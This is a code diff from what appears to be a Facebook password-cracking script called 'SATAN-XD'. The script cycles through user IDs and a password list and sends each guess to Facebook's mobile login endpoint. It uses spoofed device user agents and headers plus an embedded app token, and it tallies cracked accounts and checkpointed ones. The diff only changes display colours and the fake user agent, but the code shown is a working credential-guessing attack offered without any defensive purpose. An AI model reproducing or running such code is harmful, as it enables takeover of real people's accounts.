@@ -1,7 +1,7 @@
 def api1(ids,names,passlist,total_ids):
 	try:
 		global oks,loop,cps
-		sys.stdout.write(f'\r\r\033[1;37m [\033[1;30mSATAN-XD\033[1;37m] {loop}|\033[1;30m{total_ids} \033[1;32m[OK:{len(oks)}] \033[1;30m[CP:{len(cps)}] \033[1;37m');sys.stdout.flush()
+		sys.stdout.write(f'\r\r\033[1;37m [SATAN-XD] {loop}|{total_ids} \033[1;32m[OK:{len(oks)}] \033[1;33m[CP:{len(cps)}] \033[1;37m');sys.stdout.flush()
 		fn = names.split(' ')[0]
 		try:
 			ln = names.split(' ')[1]
@@ -13,7 +13,7 @@ def api1(ids,names,passlist,total_ids):
 			en = random.choice(["en_GB","en_US"])
 			en1 = random.choice(["GB","US"])
 			network = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
-			ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748049;FBDM/{density=1.0,width=600,height=976};FBLC/en_US;FBCR/MY CELCOM;FBMF/LENOVO;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/Lenovo TAB 2 A7-30HC;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]" 
+			ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(11111111,77777777))+"; [FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_GB;FBCR/Meteor;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One M8s;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]" 
 			head = {'User-Agent': ua, 'Accept-Encoding': 'gzip, deflate', 'Accept': '/', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': '31002', 'X-FB-SIM-HNI': '31002', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 'x-fb-device-group': '5004', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', 'Content-Length': '672'}
 			data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': en,'client_country_code': en1,'fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
 			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
